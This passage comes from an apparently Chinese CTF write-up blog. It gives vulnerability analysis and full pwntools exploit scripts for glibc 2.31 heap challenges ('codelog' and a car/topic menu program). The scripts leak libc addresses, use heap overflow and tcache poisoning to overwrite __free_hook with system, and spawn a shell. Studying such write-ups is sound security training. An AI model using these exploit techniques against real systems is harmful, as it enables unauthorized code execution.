class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    <span class="keyword">if</span>(size2 == <span class="number">0</span>):</span><br><span class="line">        size2 = size</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data2)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;introduction data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_car</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_car</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>)) </span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">publish_topic</span>(<span class="params">title,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))  </span><br><span class="line">    sla(<span class="string">&quot;title&quot;</span>,title)</span><br><span class="line">    sla(<span class="string">&quot;content size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_topic</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;comment size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;comment data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_topic</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_topic_all</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_topic_all</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_topic</span>(<span class="params">index1,index2</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index1))</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_topic</span>(<span class="params">index,title,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;title&quot;</span>,title)</span><br><span class="line">    sla(<span class="string">&quot;content size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">Register(<span class="string">&quot;name&quot;</span>,<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add_car(<span class="number">0x680</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">publish_topic(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>,<span class="number">0x20</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">0x480</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed031</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit_car(<span class="number">16</span>,<span class="string">&quot;2&quot;</span>*<span class="number">16</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: 2222222222222222&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x820</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    Register(<span class="built_in">str</span>(i),<span class="number">0x68</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit_user(<span class="string">&quot;0&quot;</span>,<span class="number">0x6a</span>,<span class="string">&quot;0&quot;</span>*<span class="number">0x68</span>+p16(<span class="number">0x691</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    dele_user(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">Register(<span class="string">&quot;a&quot;</span>,<span class="number">0x68</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">add_car(<span class="number">0x20</span>,<span class="string">&quot;p&quot;</span>,size2=<span class="number">0x600</span>,data2=<span class="string">&quot;p&quot;</span>*<span class="number">0x70</span>+p64(free_hook)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">Register(<span class="string">&quot;b&quot;</span>,<span class="number">0x68</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">Register(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0x68</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="codelog"><a href="#codelog" class="headerlink" title="codelog"></a>codelog</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">codelog: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=dd0a2bd738926ee059e1aceb6873084dcf353a1b, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序只置空了指针而没有置空 size：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( chunk_list[num].ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[num].ptr);</span><br><span class="line">  chunk_list[num].ptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆溢出漏洞：（<code>scanf</code> 没有限制输入值的长度）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;chars[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;weight: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;weights[<span class="number">16</span> * i]);</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：遇到 <code>scanf</code> 需要注意是否有堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>简单搭建一下堆风水就可以完成泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">init(<span class="number">0x48</span>,<span class="number">0x60</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">8</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">0x110</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">7</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">dele</span><span class="params">(i+<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">dele</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ru</span><span class="params">(<span class="string">&quot;log: &quot;</span>)</span></span></span><br><span class="line"><span class="function">leak_addr </span>= u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1e9061</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>利用 scanf 的堆溢出可以修改 tcache，从而劫持 free_hook</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./codelog1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x401AE1&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">size,char,weight</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        sla(<span class="string">&quot;char:&quot;</span>,char)</span><br><span class="line">        sla(<span class="string">&quot;weight:&quot;</span>,<span class="built_in">str</span>(weight))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encode</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Encode&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;input:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Input: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decode</span>(<span class="params">size,key,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Decode&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;The length of input: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">1</span>):</span><br><span class="line">        sla(<span class="string">&quot;Confirm? [Y/N]&quot;</span>,<span class="string">&quot;N&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Manual input:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show_code</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;Show_code&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show_tree</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;Show_tree&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Add_log&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;log: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Delete_log&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Print_log&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">init(<span class="number">0x48</span>,<span class="string">&quot;1&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x110</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;log: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1e9061</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;1&quot;</span>*<span class="number">7</span> + p64(libc_base+<span class="number">0x1ecbe0</span>)*<span class="number">1</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(libc_base+<span class="number">0x1ecbe0</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="number">0x70</span> * <span class="string">&quot;2&quot;</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0x240</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&quot;char:&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">&quot;weight:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;char:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;weight:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,p64(system))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rpg"><a href="#rpg" class="headerlink" title="rpg"></a>rpg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpg: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b69646b934160ce4f2f19a27b4d4637e7cd180f8, stripped                  </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
